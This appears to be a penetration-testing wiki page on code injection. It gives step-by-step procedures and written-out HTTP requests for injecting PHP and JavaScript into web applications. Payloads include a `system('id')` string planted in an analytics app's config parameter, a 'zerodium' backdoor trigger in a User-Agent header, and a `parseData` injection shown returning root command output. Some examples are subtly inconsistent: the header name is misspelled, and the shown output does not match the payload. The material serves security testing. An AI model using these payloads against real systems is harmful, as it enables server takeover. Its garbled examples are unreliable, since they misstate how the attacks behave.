# Code Injection

## Check List

## Methodology

### Black Box

#### Code Injection via Create Cache File

{% stepper %}
{% step %}
Interact with the target web application and observe that it generates client-side cache files to store application error messages
{% endstep %}

{% step %}
Identify a request sent from the client that includes user-controlled input within an array-based parameter (The important thing is that you have carefully considered who is also named `config`)

```http
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1  
Host: analytics.[REDACTED].com  
User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0  
Connection: keep-alive  
Content-Length: 95  
Content-Type: application/x-www-form-urlencoded  
Cookie: owa_p=8aacef0fbef40d5f8d8121ec2cc19aff386329fb030ead140fdf26491bcc5; owa_u=admin;; owa-u=admin; owa_p=8aacef0fbef40d5f8d8121ec2cc19aff386329fb030ead140fdf26491bcc5  
Accept-Encoding: gzip, deflate, br  

owa_action=base.optionsUpdate&owa_nonce=45faa7aae1&owa_config[darkshhadow]=<?php system('id'); ?> <--
```
{% endstep %}

{% step %}
Send the modified request to the server and observe that the application fails to properly handle the malicious input and generates an error
{% endstep %}

{% step %}
Confirm that the generated error is stored inside a cache file created by the application
{% endstep %}

{% step %}
Access the generated cache file directly through the browser
{% endstep %}

{% step %}
Observe that the injected PHP payload is executed and the command output is written inside the cache file
{% endstep %}
{% endstepper %}

***

#### Code Injection in User-Agent

{% stepper %}
{% step %}
Log into the target site and intercept requests using Burp Suite
{% endstep %}

{% step %}
Note that the target application uses PHP
{% endstep %}

{% step %}
Then make a simple request to the page, intercept the request, and send it to the Repeater
{% endstep %}

{% step %}
Send a normal request to make sure there are no errors, then inject the following value in the user-agent header

```http
GET / HTTP/1.1  
Host: HTTP-Insecure-Requests:8080  
Upgrade-Insecure-Requests: 1  
User-Agenttt: zerodiumsystem('id');]  <--- Code Injection
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8  
Connection: close
```
{% endstep %}

{% step %}
Send the request. In the server response, if the code was executed, the Code Injection vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Code Injection in Cookie Parameter

{% stepper %}
{% step %}
Log into the target site and intercept requests using Burp Suite
{% endstep %}

{% step %}
Intercept a simple request and check if the Cookie parameter is Base64 encoded
{% endstep %}

{% step %}
Delete the cookie value and then Base64 encode a malicious code based on the language written and insert it into the cookie
{% endstep %}

{% step %}
Then send the request and check if the code is executed in the server response, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Code Injection In url Parameters

{% stepper %}
{% step %}
Log in to the target site, operate the program as a normal user, and intercept requests using the Burp Suite program
{% endstep %}

{% step %}
Log in to the target site, act as a normal user, examine the features, and intercept requests using the Burp Suite program
{% endstep %}

{% step %}
On the target site, look for features and requests that request an external service or an external URL, such as the `targetUrls` parameter
{% endstep %}

{% step %}
Then, in the request sent to Url, give this parameter a URL that contains a javascript code or, depending on the language in which the program works, a JavaScript code, like

```bash
https://[REDACTED].com/cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.version+||+"Code+Injection+successful"
```
{% endstep %}

{% step %}
in the Response

```json
{
  "code": 200,
  "msg": "success",
  "source": {
    "userId": 1,
    "id": 1,
    "title": "sunt aut facere repellat provident occaecati excepturi optio reprehenderit",
    "body": "quia et suscipit\nsuscipit recusandae consequuntur expedita et cum\nreprehenderit molestiae ut ut quas totam\nnostrum rerum est autem sunt rem eveniet architecto"
  },
  "data": "uid=0(root) gid=0(root) groups=0(root)\n"
}
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
